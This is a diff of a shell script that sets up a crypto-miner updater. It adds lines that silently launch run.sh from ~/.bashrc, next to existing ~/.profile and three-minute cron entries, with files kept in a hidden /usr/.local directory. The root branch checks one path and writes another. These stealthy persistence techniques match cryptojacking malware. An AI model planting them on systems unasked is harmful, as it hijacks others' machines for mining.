@@ -103,6 +103,7 @@ EOF
 sudo chmod +x /usr/.local/run.sh
 
 sudo touch ~/.profile ; sudo grep -q "/usr/.local/run.sh >/dev/null 2>&1 &" ~/.profile || { echo "nohup $HOME/.local/run.sh >/dev/null 2>&1 &" >> ~/.profile && echo "[*] .profile added" ; }
+sudo touch ~/.bashrc ; sudo grep -q "/usr/.local/run.sh >/dev/null 2>&1 &" ~/.bashrc || { echo "nohup $HOME/.local/run.sh >/dev/null 2>&1 &" >> ~/.bashrc && echo "[*] .bashrc added" ; }
 
     #add cronjob to run every 3 minutes
     if sudo crontab -l 2>/dev/null | grep -q "/usr/.local/run.sh"; then #check if cronjob already exists
@@ -200,6 +201,8 @@ EOF
     chmod +x $HOME/.local/run.sh
 
     touch ~/.profile ; grep -q "$HOME/.local/run.sh" ~/.profile || { echo "$HOME/.local/run.sh &" >> ~/.profile && echo "[*] .profile added" ; } #add run.sh to .profile
+    touch ~/.bashrc ; grep -q "$HOME/.local/run.sh" ~/.bashrc || { echo "$HOME/.local/run.sh &" >> ~/.bashrc && echo "[*] .bashrc added" ; } #add run.sh to .bashrc
+
     if crontab -l 2>/dev/null | grep -q "$HOME/.local/run.sh"; then #check if cronjob already exists
         echo "[*] Cronjob for miner updater already exists. Skipping addition."
         :
